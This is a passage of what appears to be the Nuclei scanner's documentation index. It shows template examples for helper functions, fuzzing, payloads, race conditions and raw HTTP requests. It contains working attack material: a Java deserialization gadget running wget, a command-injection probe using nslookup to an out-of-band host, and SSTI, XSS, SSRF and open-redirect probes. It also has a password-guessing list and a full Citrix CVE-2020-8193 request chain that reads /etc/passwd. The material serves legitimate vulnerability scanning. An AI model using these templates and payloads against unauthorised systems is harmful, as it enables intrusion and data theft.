{{compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')}} 06: {{concat(\"Hello\", \"world\")}} 07: {{contains(\"Hello\", \"lo\")}} 08: {{contains_all(\"Hello everyone\", \"lo\", \"every\")}} 09: {{contains_any(\"Hello everyone\", \"abc\", \"llo\")}} 10: {{date_time(\"%Y-%M-%D\")}} 11: {{date_time(\"%Y-%M-%D\", unix_time())}} 12: {{date_time(\"%H-%m\")}} 13: {{date_time(\"02-01-2006 15:04\")}} 14: {{date_time(\"02-01-2006 15:04\", unix_time())}} 15: {{dec_to_hex(11111)}} 16: {{generate_java_gadget(\"commons-collections3.1\", \"wget http://scanme.sh\", \"base64\")}} 17: {{gzip(\"Hello\")}} 18: {{gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\"))}} 19: {{hex_decode(\"6161\")}} 20: {{hex_encode(\"aa\")}} 21: {{hmac(\"sha1\", \"test\", \"scrt\")}} 22: {{hmac(\"sha256\", \"test\", \"scrt\")}} 23: {{hmac(\"sha512\", \"test\", \"scrt\")}} 24: {{html_escape(\"<body>test</body>\")}} 25: {{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}} 26: {{join(\"_\", \"hello\", \"world\")}} 27: {{len(\"Hello\")}} 28: {{len(5555)}} 29: {{md5(\"Hello\")}} 30: {{md5(1234)}} 31: {{mmh3(\"Hello\")}} 32: {{print_debug(1+2, \"Hello\")}} 33: {{rand_base(5, \"abc\")}} 34: {{rand_base(5, \"\")}} 35: {{rand_base(5)}} 36: {{rand_char(\"abc\")}} 37: {{rand_char(\"\")}} 38: {{rand_char()}} 39: {{rand_int(1, 10)}} 40: {{rand_int(10)}} 41: {{rand_int()}} 42: {{rand_ip(\"192.168.0.0/24\")}} 43: {{rand_ip(\"2002:c0a8::/24\")}} 44: {{rand_ip(\"192.168.0.0/24\",\"10.0.100.0/24\")}} 45: {{rand_text_alpha(10, \"abc\")}} 46: {{rand_text_alpha(10, \"\")}} 47: {{rand_text_alpha(10)}} 48: {{rand_text_alphanumeric(10, \"ab12\")}} 49: {{rand_text_alphanumeric(10)}} 50: {{rand_text_numeric(10, 123)}} 51: {{rand_text_numeric(10)}} 52: {{regex(\"H([a-z]+)o\", \"Hello\")}} 53: {{remove_bad_chars(\"abcd\", \"bc\")}} 54: {{repeat(\"a\", 5)}} 55: {{replace(\"Hello\", \"He\", \"Ha\")}} 56: {{replace_regex(\"He123llo\", \"(\\\\d+)\", \"\")}} 57: {{reverse(\"abc\")}} 58: {{sha1(\"Hello\")}} 59: {{sha256(\"Hello\")}} 60: {{sha512(\"Hello\")}} 61: {{to_lower(\"HELLO\")}} 62: {{to_upper(\"hello\")}} 63: {{trim(\"aaaHelloddd\", \"ad\")}} 64: {{trim_left(\"aaaHelloddd\", \"ad\")}} 65: {{trim_prefix(\"aaHelloaa\", \"aa\")}} 66: {{trim_right(\"aaaHelloddd\", \"ad\")}} 67: {{trim_space(\" Hello \")}} 68: {{trim_suffix(\"aaHelloaa\", \"aa\")}} 69: {{unix_time(10)}} 70: {{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}} 71: {{url_encode(\"https://projectdiscovery.io/test?a=1\")}} 72: {{wait_for(1)}} 73: {{zlib(\"Hello\")}} 74: {{zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\"))}} 75: {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} 76: {{starts_with(\"Hello\", \"He\")}} 77: {{ends_with(\"Hello\", \"lo\")}} 78: {{line_starts_with(\"Hi\\nHello\", \"He\")}} 79: {{line_ends_with(\"Hello\\nHi\", \"lo\")}} 80: {{sort(\"a1b2c3d4e5\")}} 81: {{uniq(\"abcabdaabbccd\")}} 82: {{join(\" \", sort(\"b\", \"a\", \"2\", \"c\", \"3\", \"1\", \"d\", \"4\"))}} 83: {{join(\" \", uniq(\"ab\", \"cd\", \"12\", \"34\", \"12\", \"cd\"))}} 84: {{split(\"ab,cd,efg\", \",\")}} 85: {{split(\"ab,cd,efg\", \",\", 2)}} 86: {{ip_format('127.0.0.1', 3)}} 87: {{ip_format('127.0.1.0', 11)}} For a more complete and up to date list check the dsl repository","title":"Helpers"},{"location":"template-examples/helper-functions/#helper-functions-examples","text":"Nuclei has a number of helper functions that may be used to conduct various run-time operations on the request block. Here's an example template that shows how to use all the available helper functions. id : helper-functions-examples info : name : RAW Template with Helper Functions author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} 01: {{base64(\"Hello\")}} 02: {{base64(1234)}} 03: {{base64_decode(\"SGVsbG8=\")}} 04: {{base64_py(\"Hello\")}} 05: {{compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')}} 06: {{concat(\"Hello\", \"world\")}} 07: {{contains(\"Hello\", \"lo\")}} 08: {{contains_all(\"Hello everyone\", \"lo\", \"every\")}} 09: {{contains_any(\"Hello everyone\", \"abc\", \"llo\")}} 10: {{date_time(\"%Y-%M-%D\")}} 11: {{date_time(\"%Y-%M-%D\", unix_time())}} 12: {{date_time(\"%H-%m\")}} 13: {{date_time(\"02-01-2006 15:04\")}} 14: {{date_time(\"02-01-2006 15:04\", unix_time())}} 15: {{dec_to_hex(11111)}} 16: {{generate_java_gadget(\"commons-collections3.1\", \"wget http://scanme.sh\", \"base64\")}} 17: {{gzip(\"Hello\")}} 18: {{gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\"))}} 19: {{hex_decode(\"6161\")}} 20: {{hex_encode(\"aa\")}} 21: {{hmac(\"sha1\", \"test\", \"scrt\")}} 22: {{hmac(\"sha256\", \"test\", \"scrt\")}} 23: {{hmac(\"sha512\", \"test\", \"scrt\")}} 24: {{html_escape(\"<body>test</body>\")}} 25: {{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}} 26: {{join(\"_\", \"hello\", \"world\")}} 27: {{len(\"Hello\")}} 28: {{len(5555)}} 29: {{md5(\"Hello\")}} 30: {{md5(1234)}} 31: {{mmh3(\"Hello\")}} 32: {{print_debug(1+2, \"Hello\")}} 33: {{rand_base(5, \"abc\")}} 34: {{rand_base(5, \"\")}} 35: {{rand_base(5)}} 36: {{rand_char(\"abc\")}} 37: {{rand_char(\"\")}} 38: {{rand_char()}} 39: {{rand_int(1, 10)}} 40: {{rand_int(10)}} 41: {{rand_int()}} 42: {{rand_ip(\"192.168.0.0/24\")}} 43: {{rand_ip(\"2002:c0a8::/24\")}} 44: {{rand_ip(\"192.168.0.0/24\",\"10.0.100.0/24\")}} 45: {{rand_text_alpha(10, \"abc\")}} 46: {{rand_text_alpha(10, \"\")}} 47: {{rand_text_alpha(10)}} 48: {{rand_text_alphanumeric(10, \"ab12\")}} 49: {{rand_text_alphanumeric(10)}} 50: {{rand_text_numeric(10, 123)}} 51: {{rand_text_numeric(10)}} 52: {{regex(\"H([a-z]+)o\", \"Hello\")}} 53: {{remove_bad_chars(\"abcd\", \"bc\")}} 54: {{repeat(\"a\", 5)}} 55: {{replace(\"Hello\", \"He\", \"Ha\")}} 56: {{replace_regex(\"He123llo\", \"(\\\\d+)\", \"\")}} 57: {{reverse(\"abc\")}} 58: {{sha1(\"Hello\")}} 59: {{sha256(\"Hello\")}} 60: {{sha512(\"Hello\")}} 61: {{to_lower(\"HELLO\")}} 62: {{to_upper(\"hello\")}} 63: {{trim(\"aaaHelloddd\", \"ad\")}} 64: {{trim_left(\"aaaHelloddd\", \"ad\")}} 65: {{trim_prefix(\"aaHelloaa\", \"aa\")}} 66: {{trim_right(\"aaaHelloddd\", \"ad\")}} 67: {{trim_space(\" Hello \")}} 68: {{trim_suffix(\"aaHelloaa\", \"aa\")}} 69: {{unix_time(10)}} 70: {{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}} 71: {{url_encode(\"https://projectdiscovery.io/test?a=1\")}} 72: {{wait_for(1)}} 73: {{zlib(\"Hello\")}} 74: {{zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\"))}} 75: {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} 76: {{starts_with(\"Hello\", \"He\")}} 77: {{ends_with(\"Hello\", \"lo\")}} 78: {{line_starts_with(\"Hi\\nHello\", \"He\")}} 79: {{line_ends_with(\"Hello\\nHi\", \"lo\")}} 80: {{sort(\"a1b2c3d4e5\")}} 81: {{uniq(\"abcabdaabbccd\")}} 82: {{join(\" \", sort(\"b\", \"a\", \"2\", \"c\", \"3\", \"1\", \"d\", \"4\"))}} 83: {{join(\" \", uniq(\"ab\", \"cd\", \"12\", \"34\", \"12\", \"cd\"))}} 84: {{split(\"ab,cd,efg\", \",\")}} 85: {{split(\"ab,cd,efg\", \",\", 2)}} 86: {{ip_format('127.0.0.1', 3)}} 87: {{ip_format('127.0.1.0', 11)}} For a more complete and up to date list check the dsl repository","title":"Helper Functions Examples"},{"location":"template-examples/http-fuzzing/","text":"Basic SSTI Template \u00b6 A simple template to discover {{<number>*<number>}} type SSTI vulnerabilities. id : fuzz-reflection-ssti info : name : Basic Reflection Potential SSTI Detection author : pdteam severity : low variables : first : \"{{rand_int(10000, 99999)}}\" second : \"{{rand_int(10000, 99999)}}\" result : \"{{to_number(first)*to_number(second)}}\" http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - '{{concat(\"{{\", \"\u00a7first\u00a7*\u00a7second\u00a7\", \"}}\")}}' fuzzing : - part : query type : postfix mode : multiple fuzz : - \"{{reflection}}\" matchers : - type : word part : body words : - \"{{result}}\" Basic XSS Template \u00b6 A simple template to discover XSS probe reflection in HTML pages. id : fuzz-reflection-xss info : name : Basic Reflection Potential XSS Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" matchers-condition : and matchers : - type : word part : body words : - \"{{reflection}}\" - type : word part : header words : - \"text/html\" Basic OpenRedirect Template \u00b6 A simple template to discover open-redirects issues. id : fuzz-open-redirect info : name : Basic Open Redirect Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"https://example.com\" fuzzing : - part : query type : replace mode : single keys-regex : - \"redirect.*\" fuzz : - \"{{redirect}}\" matchers-condition : and matchers : - type : word part : header words : - \"{{redirect}}\" - type : status status : - 301 - 302 - 307 Blind SSRF OOB Detection \u00b6 A simple template to detect Blind SSRF in known-parameters using interact.sh with HTTP fuzzing. id : fuzz-ssrf info : name : Basic Blind SSRF Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"{{interactsh-url}}\" fuzzing : - part : query type : replace mode : single keys : - \"dest\" - \"redirect\" - \"uri\" - \"path\" - \"continue\" - \"url\" - \"window\" - \"next\" - \"data\" - \"reference\" - \"site\" - \"html\" - \"val\" - \"validate\" - \"domain\" - \"callback\" - \"return\" - \"page\" - \"feed\" - \"host\" - \"port\" - \"to\" - \"out\" - \"view\" - \"dir\" - \"show\" - \"navigation\" - \"open\" fuzz : - \"https://{{redirect}}\" matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"http\" Blind CMDi OOB based detection \u00b6 A simple template to detect blind CMDI using interact.sh id : fuzz-cmdi info : name : Basic Blind CMDI Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"{{interactsh-url}}\" fuzzing : fuzz : - \"nslookup {{redirect}}\" matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\"","title":"HTTP Fuzzing"},{"location":"template-examples/http-fuzzing/#basic-ssti-template","text":"A simple template to discover {{<number>*<number>}} type SSTI vulnerabilities. id : fuzz-reflection-ssti info : name : Basic Reflection Potential SSTI Detection author : pdteam severity : low variables : first : \"{{rand_int(10000, 99999)}}\" second : \"{{rand_int(10000, 99999)}}\" result : \"{{to_number(first)*to_number(second)}}\" http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - '{{concat(\"{{\", \"\u00a7first\u00a7*\u00a7second\u00a7\", \"}}\")}}' fuzzing : - part : query type : postfix mode : multiple fuzz : - \"{{reflection}}\" matchers : - type : word part : body words : - \"{{result}}\"","title":"Basic SSTI Template"},{"location":"template-examples/http-fuzzing/#basic-xss-template","text":"A simple template to discover XSS probe reflection in HTML pages. id : fuzz-reflection-xss info : name : Basic Reflection Potential XSS Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" matchers-condition : and matchers : - type : word part : body words : - \"{{reflection}}\" - type : word part : header words : - \"text/html\"","title":"Basic XSS Template"},{"location":"template-examples/http-fuzzing/#basic-openredirect-template","text":"A simple template to discover open-redirects issues. id : fuzz-open-redirect info : name : Basic Open Redirect Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"https://example.com\" fuzzing : - part : query type : replace mode : single keys-regex : - \"redirect.*\" fuzz : - \"{{redirect}}\" matchers-condition : and matchers : - type : word part : header words : - \"{{redirect}}\" - type : status status : - 301 - 302 - 307","title":"Basic OpenRedirect Template"},{"location":"template-examples/http-fuzzing/#blind-ssrf-oob-detection","text":"A simple template to detect Blind SSRF in known-parameters using interact.sh with HTTP fuzzing. id : fuzz-ssrf info : name : Basic Blind SSRF Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"{{interactsh-url}}\" fuzzing : - part : query type : replace mode : single keys : - \"dest\" - \"redirect\" - \"uri\" - \"path\" - \"continue\" - \"url\" - \"window\" - \"next\" - \"data\" - \"reference\" - \"site\" - \"html\" - \"val\" - \"validate\" - \"domain\" - \"callback\" - \"return\" - \"page\" - \"feed\" - \"host\" - \"port\" - \"to\" - \"out\" - \"view\" - \"dir\" - \"show\" - \"navigation\" - \"open\" fuzz : - \"https://{{redirect}}\" matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"http\"","title":"Blind SSRF OOB Detection"},{"location":"template-examples/http-fuzzing/#blind-cmdi-oob-based-detection","text":"A simple template to detect blind CMDI using interact.sh id : fuzz-cmdi info : name : Basic Blind CMDI Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : redirect : - \"{{interactsh-url}}\" fuzzing : fuzz : - \"nslookup {{redirect}}\" matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\"","title":"Blind CMDi OOB based detection"},{"location":"template-examples/http-payloads/","text":"HTTP Intruder fuzzing \u00b6 This template makes a defined POST request in RAW format along with in template defined payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. http : - raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available: batteringram,pitchfork,clusterbomb matchers : - type : word words : - \"Test is test matcher text\" Fuzzing multiple requests \u00b6 This template makes a defined POST request in RAW format along with wordlist based payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} attack : clusterbomb # Available types: batteringram,pitchfork,clusterbomb payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt matchers : - type : word words : - \"Test is test matcher text\" Authenticated fuzzing \u00b6 This template makes a subsequent HTTP requests with defined requests maintaining sessions between each request and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} testing=parameter cookie-reuse : true # Cookie-reuse maintain the session between all request like browser. matchers : - type : word words : - \"Test is test matcher text\" Dynamic variable support \u00b6 This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high reference : https://github.com/jas502n/CVE-2020-8193 http : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey # Variable name part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"HTTP Payloads"},{"location":"template-examples/http-payloads/#http-intruder-fuzzing","text":"This template makes a defined POST request in RAW format along with in template defined payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. http : - raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available: batteringram,pitchfork,clusterbomb matchers : - type : word words : - \"Test is test matcher text\"","title":"HTTP Intruder fuzzing"},{"location":"template-examples/http-payloads/#fuzzing-multiple-requests","text":"This template makes a defined POST request in RAW format along with wordlist based payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} attack : clusterbomb # Available types: batteringram,pitchfork,clusterbomb payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt matchers : - type : word words : - \"Test is test matcher text\"","title":"Fuzzing multiple requests"},{"location":"template-examples/http-payloads/#authenticated-fuzzing","text":"This template makes a subsequent HTTP requests with defined requests maintaining sessions between each request and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} testing=parameter cookie-reuse : true # Cookie-reuse maintain the session between all request like browser. matchers : - type : word words : - \"Test is test matcher text\"","title":"Authenticated fuzzing"},{"location":"template-examples/http-payloads/#dynamic-variable-support","text":"This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high reference : https://github.com/jas502n/CVE-2020-8193 http : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey # Variable name part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Dynamic variable support"},{"location":"template-examples/http-race-conditions/","text":"Race condition testing with single POST request. \u00b6 This template makes a defined POST request in RAW format to /coupons endpoint, as the race_count is defined as 10 , this will make 10 requests at same time by holding last bytes for all the requests which sent together for all requests synchronizing the send event. You can also define the matcher as any other template for the expected output which helps to identify if the race condition exploit worked or not. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 Race condition testing with multiple requests. \u00b6 This template makes the defined and multiple POST requests in RAW format with threads sets to 5 , threads can be utilized in race condition templates when multiple requests needs to be sent to exploit the race condition, threads number should be same as the number of you are making with template and not needed if you're only making single request. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"Race Condition"},{"location":"template-examples/http-race-conditions/#race-condition-testing-with-single-post-request","text":"This template makes a defined POST request in RAW format to /coupons endpoint, as the race_count is defined as 10 , this will make 10 requests at same time by holding last bytes for all the requests which sent together for all requests synchronizing the send event. You can also define the matcher as any other template for the expected output which helps to identify if the race condition exploit worked or not. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200","title":"Race condition testing with single POST request."},{"location":"template-examples/http-race-conditions/#race-condition-testing-with-multiple-requests","text":"This template makes the defined and multiple POST requests in RAW format with threads sets to 5 , threads can be utilized in race condition templates when multiple requests needs to be sent to exploit the race condition, threads number should be same as the number of you are making with template and not needed if you're only making single request. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"Race condition testing with multiple requests."},{"location":"template-examples/http-raw/","text":"Basic template \u00b6 This template makes GET request to / path in RAW format and checking for string match against response. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\" Multiple RAW request \u00b6 This template makes GET and POST request sequentially in RAW format and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Raw HTTP"},{"location":"template-examples/http-raw/#basic-template","text":"This template makes GET request to / path in RAW format and checking for string match against response. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\"","title":"Basic template"},{"location":"template-examples/http-raw/#multiple-raw-request","text":"This template makes GET and POST request sequentially in RAW format and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 